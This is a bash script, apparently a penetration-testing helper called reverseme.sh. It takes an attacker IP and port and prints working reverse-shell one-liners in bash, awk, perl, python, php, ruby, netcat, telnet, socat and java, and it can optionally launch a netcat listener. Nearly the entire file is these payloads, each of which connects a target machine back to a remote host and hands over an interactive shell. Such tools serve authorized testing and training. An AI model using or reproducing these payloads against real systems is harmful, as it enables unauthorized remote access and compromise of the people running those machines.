#!/bin/bash

# This script will allow you to set a default IP and paste reverse shells on the fly

######## Written by Matthew Greer ########
######## J>^v ########

RED='\033[0;31m' # Display titles
GREEN='\033[0;32m' # Display helpful information
NC='\033[0m' # Default color

clear # clear the screen place # before clear, if you want to disable this option

# Display bash shells
function bash() {
    printf "\n\t${RED}##########${NC}BASH SHELL(S)${RED}##########${NC}\n\n"

    printf "bash -i >& /dev/tcp/${HOST}/${LPORT} 0>&1"

    printf "\n\n"

    printf "exec /bin/bash 0&0 2>&0"

    printf "\n\n"

    printf "0<&196;exec 196<>/dev/tcp/${HOST}/${LPORT}; sh <&196 >&196 2>&196"

    printf "exec 5<>/dev/tcp/${HOST}/${LPORT} cat <&5 | while read line; do $line 2>&5 >&5; done"

    printf "\n\n"
}

function awk() {
    printf "\n\t${RED}##########${NC}AWK SHELL(S)${RED}##########${NC}\n\n"

    printf "awk 'BEGIN {s = \"/inet/tcp/0/${HOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"

    printf "\n\n"
}

# Display perl shells
function perl() {
    printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"

    printf "perl -e 'use Socket;$i=\"${HOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

    printf "\n\n"

    printf "${GREEN} LINUX: ${NC}\n"

    printf "\tperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${HOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"

    printf "\n\n"

    printf "${GREEN} WINDOWS: ${NC}\n"

    printf "\tperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${HOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"

    printntf "\n\n"
}

# Display python shells
function python() {
    printf "\n\t${RED}##########${NC}PYTHON SHELL(S)${RED}##########${NC}\n\n"

    printf "${GREEN} TCP: ${NC}\n"
    printf "\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${HOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    printf "\n\n"

    printf "${GREEN} STCP: ${NC}\n"
    printf "\tpython -c 'import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\"${HOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();exit();'"
    
    printf "\n\n"

    printf "${GREEN} UDP: ${NC}\n"
    printf "\tpython -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"${HOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();'"

    printf "\n\n"
}

# Display php shells
function php() {
    printf "\n\t${RED}##########${NC}PHP SHELL(S)${RED}##########${NC}\n\n"

    printf "php -r '$sock=fsockopen(\"${HOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    printf "\n\n"
}

# Display ruby shells
function ruby() {
    printf "\n\t${RED}##########${NC}RUBY SHELL(S)${RED}##########${NC}\n\n"

    printf "ruby -rsocket -e'f=TCPSocket.open(\"${HOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

    printf "\n\n"

    printf "${GREEN} LINUX: ${NC}\n"

    printf "\truby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${HOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

    printf "\n\n"

    printf "${GREEN} WINDOWS: ${NC}\n"

    printf "\truby -rsocket -e 'c=TCPSocket.new(\"${HOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

    printf "\n\n"
}

# Display netcat shells
function netcat() {
    printf "\n\t${RED}##########${NC}NETCAT SHELL(S)${RED}##########${NC}\n\n"

    printf "nc -e /bin/sh ${HOST} ${LPORT}"

    printf "\n\n"

    printf "nc -c /bin/sh ${HOST} ${LPORT}"

    printf "\n\n"

    printf "/bin/sh | nc ${HOST} ${LPORT}"

    printf "\n\n"

    printf "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${HOST} ${LPORT} >/tmp/f"

    printf "\n\n"
}

# Display telnet shells
function telnet() {
    printf "\n\t${RED}##########${NC}TELNET SHELL(S)${RED}##########${NC}\n\n"

    printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${HOST} ${LPORT} 0/tmp/p"

    printf "\n\n"

    printf "${GREEN} Listen on machine on port 4445/tcp ${NC}\n"

    printf "\ttelnet ${HOST} ${LPORT} | /bin/bash | telnet ${HOST} 4445"

    printf "\n\n"
}

function socat() {
    printf "\n\t${RED}##########${NC}SOCAT SHELL(S)${RED}##########${NC}\n\n"

    printf "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${HOST}:${LPORT}"

    printf "\n\n"
}
# Display java shells
function java() {
    printf "\n\t${RED}##########${NC}JAVA SHELL(S)${RED}##########${NC}\n\n"

    printf "r = Runtime.getRuntime()"
    printf "\n"
    printf "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${HOST}/${LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])"
    printf "\n"
    printf "p.waitFor()"

    printf "\n\n"

}

# Spawn nc listener with -l option
function spawn_listener() {
    gnome-terminal -e "nc -lvp ${LPORT}"

}

# Display help menu with -h option
function help() {
    printf "\n\t\t${RED}##########${NC}HELP MENU${RED}##########${NC}\n\n"

    printf "\nreverseme.sh -h Display's this help menu.\n"

    printf "\nreverseme.sh -d Dispaly's list of available shells.\n"

    printf "\nUsuage: reverseme.sh -H [HOST] -L [LPORT] -S [REVERSE-SHELL-SELECTION] ${GREEN}OPTIONAL${NC} -l [SPAWN-NC-LISTENER]\n"

    printf "\nreverseme.sh -s Display's source information.\n"

    printf "\nreverseme.sh -V Display's version information.\n\n"

    exit 0
}

# Display sources with -s option
function sources() {
    printf "\n\t${RED}##########${NC}SOURCES${RED}##########${NC}\n\n"
    printf "${GREEN} PENTEST MONKEY ${NC}\n"
    printf "\thttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n\n"

    printf "${GREEN} BERNARDO REVERSE SHELL ONE LINERS ${NC}\n"
    printf "\thttps://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html\n\n"

    printf "${GREEN} THE PORTAL OF KNOWLEDGE ${NC}\n"
    printf "\thttps://alamot.github.io/reverse_shells/?fbclid=IwAR2SaVusp6EzFGtQ47WLYfC9M1dl2UxBx0ulvjhALDQO3OaeCv90ud6Vuzw"

    printf "\n\n"

    exit 0
}

# Display version information with -V option
function version() {
    printf "\n\t${RED}##########${NC}VERSION${RED}##########${NC}\n\n"

    printf "\nVersion:\t2.2\n\n"

    exit 0
}

function displayShells() {
    printf "\n\t${RED}##########${NC}LIST OF AVAILABLE SHELLS${RED}##########${NC}\n\n"

    printf "\t\t${GREEN}Shell\t Number of shells${NC}\n"
    printf "\t\t-----\t ----------------\n"

    printf "\t\tBash\t\t(3)\n"
    printf "\t\tAwk\t\t(1)\n"
    printf "\t\tPerl\t\t(3)\n"
    printf "\t\tPython\t\t(3)\n"
    printf "\t\tPHP\t\t(1)\n"
    printf "\t\tRuby\t\t(3)\n"
    printf "\t\tNetcat\t\t(4)\n"
    printf "\t\tTelnet\t\t(2)\n"
    printf "\t\tSocat\t\t(1)\n"
    printf "\t\tJava\t\t(1)\n\n"

    exit 0
}

while getopts "hsVdH:L:S:l" arg; do
    case $arg in 
        h) # help menu
            help
            break
           ;;
        s) # Display sources
            sources
            break
            ;;

        V) # Display version information
            version
            break
            ;;

        d) # Display list of available shells
            displayShells
            break
            ;;

        H) # set attack RHOST
            HOST=$OPTARG
            ;;
            
        L) # set lport
            LPORT=$OPTARG
            ;;
            
        S) # Select what language to display reverse shell in
            SELECTION=$OPTARG
            ;;

        l)
            spawn_listener
            ;;   
    esac
done

# Check if host is valid IP and lport is valid port
if [[ ! ${HOST} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] ; then
    printf "Please give valid IP for host!\n\n"
    exit 1
elif [[ ! ${LPORT} =~ ^[0-9]{1,5}$ ]] ; then
    printf "Please give valid port for lport!\n\n"
    exit 1
fi


if [[ -z ${HOST} ]] || [[ -z ${LPORT} ]] ; then
    printf "\nPlease specify an attack-ip and/or a listening port!\n\n"
    exit 1

elif [[ ${HOST} ]]  || [[ ${LPORT} ]] && [[ -z ${SELECTION} ]] ; then
    printf "\nPlease specify a reverse shell to display!\n\n"
    exit 1

elif [[ "${SELECTION}" == "bash" ]] || [[ "${SELECTION}" == "BASH" ]] || [[ "${SELECTION}" == "Bash" ]] ; then
    bash

elif [[ "${SELECTION}" == "awk" ]] || [[ "${SELECTION}" == "AWK" ]] || [[ "${SELECTION}" == "Awk" ]] ; then
    awk

elif [[ "${SELECTION}" == "perl" ]] || [[ "${SELECTION}" == "PERL" ]] || [[ "${SELECTION}" == "Perl" ]] ; then
    perl
    
elif [[ "${SELECTION}" == "python" ]] || [[ "${SELECTION}" == "PYTHON" ]] || [[ "${SELECTION}" == "Python" ]] ; then
    python

elif [[ "${SELECTION}" == "php" ]] || [[ "${SELECTION}" == "PHP" ]] || [[ "${SELECTION}" == "Php" ]] ; then
    php

elif [[ "${SELECTION}" == "ruby" ]] || [[ "${SELECTION}" == "RUBY" ]] || [[ "${SELECTION}" == "Ruby" ]] ; then
    ruby

elif [[ "${SELECTION}" == "netcat" ]] || [[ "${SELECTION}" == "NETCAT" ]] || [[ "${SELECTION}" == "Netcat" ]] ; then
    netcat

elif [[ "${SELECTION}" == "telnet" ]] || [[ "${SELECTION}" == "TELNET" ]] || [[ "${SELECTION}" == "Telnet" ]] ; then
    telnet

elif [[ "${SELECTION}" == "socat" ]] || [[ "${SELECTION}" == "SOCAT" ]] || [[ "${SELECTION}" == "Socat" ]] ; then
    socat

elif [[ "${SELECTION}" == "java" ]] || [[ "${SELECTION}" == "JAVA" ]] || [[ "${SELECTION}" == "Java" ]] ; then
    java

else
    printf "\nNot a valid argument!\n\n"
    exit 1
fi
